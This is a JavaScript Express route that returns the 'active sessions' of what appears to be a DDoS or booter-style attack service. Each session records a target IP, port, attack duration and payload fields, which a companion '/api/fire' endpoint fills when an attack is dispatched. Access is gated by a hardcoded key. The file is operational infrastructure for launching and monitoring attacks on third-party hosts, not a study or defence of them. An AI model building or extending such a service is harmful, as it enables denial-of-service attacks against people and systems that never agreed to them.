/**
 * /api/soul — Live active-session listing (fixed pre-shared key).
 *
 *   GET /api/soul?keys=soulcrack-tg-pvt-key
 *
 * Response shape:
 * {
 *   "active_sessions": <n>,
 *   "sessions": [
 *      { "ip": "...", "port": "...", "time": "...",
 *        "paylods": "...", "paylods2": "...", "payloads3": "..." },
 *      ...
 *   ]
 * }
 *
 * Sessions are populated by /api/fire when an attack is dispatched, and removed
 * automatically once the attack window elapses.
 */
const express = require('express');
const { db } = require('../db/database');

const router = express.Router();

const SOUL_KEY = 'soulcrack-tg-pvt-key';

// Ensure table exists (mirror of the one in fire.js — safe to repeat)
try {
  db.prepare(`CREATE TABLE IF NOT EXISTS active_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    key_value TEXT,
    ip TEXT,
    port TEXT,
    time TEXT,
    payload1 TEXT,
    payload2 TEXT,
    payload3 TEXT,
    option TEXT,
    started_at TEXT DEFAULT (CURRENT_TIMESTAMP),
    ends_at TEXT
  )`).run();
} catch (_) {}

function pruneExpired() {
  try {
    db.prepare(`DELETE FROM active_sessions WHERE ends_at IS NOT NULL AND ends_at <= ?`)
      .run(new Date().toISOString());
  } catch (_) {}
}

router.get('/', (req, res) => {
  const provided = (req.query.keys || req.query.key || '').toString();
  if (provided !== SOUL_KEY) {
    return res.status(403).json({ error: 'forbidden' });
  }

  pruneExpired();

  let rows = [];
  try {
    rows = db.prepare(`SELECT ip, port, time, payload1, payload2, payload3
                       FROM active_sessions
                       ORDER BY id DESC`).all();
  } catch (_) { rows = []; }

  const sessions = rows.map(r => ({
    ip: r.ip || '',
    port: r.port || '',
    time: r.time || '',
    paylods:   r.payload1 || '',
    paylods2:  r.payload2 || '',
    payloads3: r.payload3 || ''
  }));

  return res.json({
    active_sessions: sessions.length,
    sessions
  });
});

module.exports = router;
